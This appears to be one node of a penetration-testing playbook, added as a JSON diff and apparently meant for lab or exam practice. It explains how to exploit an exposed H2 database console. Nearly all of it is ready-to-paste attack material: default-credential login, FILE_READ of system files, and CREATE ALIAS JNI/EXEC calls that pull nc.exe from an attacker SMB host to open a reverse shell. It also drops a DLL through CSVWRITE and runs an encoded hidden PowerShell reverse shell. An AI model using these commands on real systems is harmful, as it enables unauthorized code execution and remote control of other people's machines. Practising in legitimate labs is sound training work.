@@ -1,0 +1,34 @@
+{
+  "id": "h2_console_rce",
+  "phase": "WEB",
+  "title": "H2 Database Console — JNI RCE, FILE_READ, CSVWRITE DLL Drop",
+  "body": "H2 is an embedded Java SQL database with a web console. When the console is exposed (port 8082 by default, or redirected via IIS/Apache on 80/443), it gives you SQL execution as the service account. Version 1.4.199 is vulnerable to JNI code execution via CREATE ALIAS — the exploit is just SQL you paste into the console, no script required.\n\nFingerprint: nmap shows 'H2 database http console' and http-title 'H2 Console'. Browser shows the H2 login page with version in the left panel after connecting. Default credentials are sa / (empty password) with JDBC URL jdbc:h2:~/test.\n\nThree techniques from SQL, in order of preference: (1) FILE_READ to confirm RCE is possible and read sensitive files, (2) JNI exec via SMB to pull and run nc.exe, (3) CSVWRITE to drop a DLL then load it for more reliable execution. Techniques 2 and 3 both require SYSTEM32 access so check whoami and SeImpersonate first.",
+  "cmd": "# ══════════════════════════════════════════════════\n# 1 — CONNECT\n# ══════════════════════════════════════════════════\n# Navigate to: http://<IP>:8082\n# Default creds: User=sa, Password=(blank), JDBC URL=jdbc:h2:~/test\n# Version shows in left panel after connecting — note it.\n# < 1.4.200 = JNI code execution available\n\n# ══════════════════════════════════════════════════\n# 2 — FILE_READ (confirm access, read sensitive files)\n# ══════════════════════════════════════════════════\n# Works on all versions — built-in H2 function, no alias needed.\nSELECT FILE_READ('C:\\Windows\\system.ini', NULL);\nSELECT FILE_READ('C:\\Users\\Administrator\\Desktop\\proof.txt', NULL);\nSELECT FILE_READ('C:\\Windows\\System32\\drivers\\etc\\hosts', NULL);\n# Returns file contents in the result row.\n# Useful to confirm what user the service runs as by reading user-specific files.\n\n# ══════════════════════════════════════════════════\n# 3 — JNI EXEC via SMB + nc.exe (quickest shell)\n# ══════════════════════════════════════════════════\n# On Kali first:\n#   cp /usr/share/windows-binaries/nc.exe ~/share/\n#   cd ~/share && impacket-smbserver Share $(pwd) -smb2support\n#   nc -lvnp 443\n\n# Then paste into H2 console SQL box:\nCREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR \"JNIScriptEngine.eval\";\nCALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec(\"cmd.exe /c //192.168.45.166/Share/nc.exe -e cmd.exe 192.168.45.166 443\").getInputStream()).useDelimiter(\"\\\\Z\").next()');\n\n# Watch the SMB server — target authenticates to pull nc.exe, then shell lands.\n# If alias already exists: skip CREATE ALIAS, run CALL line alone.\n\n# Quick RCE check first (confirm execution before reverse shell):\nCREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR \"JNIScriptEngine.eval\";\nCALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec(\"whoami\").getInputStream()).useDelimiter(\"\\\\Z\").next()');\n\n# Simpler EXEC alias (alternative to JNI):\nCREATE ALIAS IF NOT EXISTS EXEC AS $$\nString exec(String cmd) throws java.io.IOException {\n    java.lang.Runtime.getRuntime().exec(cmd);\n    return \"ok\";\n}\n$$;\nCALL EXEC('cmd.exe /c \\\\\\\\192.168.45.166\\\\share\\\\nc.exe -e cmd.exe 192.168.45.166 443');\n\n# ══════════════════════════════════════════════════\n# 4 — CSVWRITE DLL DROP (when SMB is blocked)\n# ══════════════════════════════════════════════════\n# Generate JNIScriptEngine.dll on Kali:\n# (download from the H2 JNI exploit repo — it's the Java native bridge)\n# Then write it to the target via CSVWRITE:\nSELECT CSVWRITE('C:\\Windows\\Temp\\JNIScriptEngine.dll', 'SELECT CONCAT(CHAR(0x4D),CHAR(0x5A),...)', '');\n# Load the DLL:\nCREATE ALIAS IF NOT EXISTS System_load FOR \"java.lang.System.load\";\nCALL System_load('C:\\Windows\\Temp\\JNIScriptEngine.dll');\n# Then use the JNIScriptEngine_eval alias as in step 3.\n# This avoids the SMB requirement — the DLL is written locally via SQL.\n\n# ══════════════════════════════════════════════════\n# 5 — POST-SHELL: BROKEN PATH (common on H2 shells)\n# ══════════════════════════════════════════════════\n# H2 inherits the Java process PATH which often doesn't include System32.\n# Symptom: 'whoami' is not recognized as an internal or external command\n# Fix — set PATH in the shell before anything else:\nset PATH=%SystemRoot%\\system32;%SystemRoot%;\n# Then run commands with full paths if needed:\nC:\\Windows\\System32\\whoami /priv\nC:\\Windows\\System32\\whoami /groups\n# Check for SeImpersonatePrivilege → SigmaPotato/PrintSpoofer\n\n# ══════════════════════════════════════════════════\n# 6 — ENCODED POWERSHELL (if nc.exe fails)\n# ══════════════════════════════════════════════════\n# Generate base64 PS reverse shell with encode.py:\n# cat encode.py:\n#   import sys, base64\n#   payload = '$client = New-Object System.Net.Sockets.TCPClient(\"LHOST\",LPORT);...'\n#   cmd = \"powershell -nop -w hidden -e \" + base64.b64encode(payload.encode('utf16')[2:]).decode()\n#   print(cmd)\n# python3 encode.py → copy the output\n# Then execute via JNI:\nCALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec(new String[]{\"cmd.exe\",\"/c\",\"powershell -nop -w hidden -e <BASE64>\"}).getInputStream()).useDelimiter(\"\\\\Z\").next()');",
+  "warn": "The H2 console login has NO authentication by default (sa / blank) but some deployments set a password. Try sa/sa, sa/h2, sa/password if blank fails. The JNI alias persists in the H2 session — if CREATE ALIAS errors with 'already exists', just run the CALL line. The Java exec does NOT return output by default — the Scanner/useDelimiter pattern is what captures it. Without that wrapper, exec() fires but you see nothing. On broken PATH shells, always set PATH first or use full System32 paths for every command.",
+  "choices": [
+    {
+      "label": "Got shell — SeImpersonate → SigmaPotato",
+      "next": "seimpersonate"
+    },
+    {
+      "label": "Broken PATH — fix and enumerate",
+      "next": "windows_post_exploit"
+    },
+    {
+      "label": "SeImpersonate → SigmaPotato/PrintSpoofer",
+      "next": "seimpersonate"
+    },
+    {
+      "label": "Need to transfer files to the target",
+      "next": "reverse_shell"
+    },
+    {
+      "label": "SMB hosted shell — pull nc.exe off your share",
+      "next": "smb_hosted_shell"
+    },
+    {
+      "label": "Back to web enum",
+      "next": "web_enum"
+    }
+  ]
+}
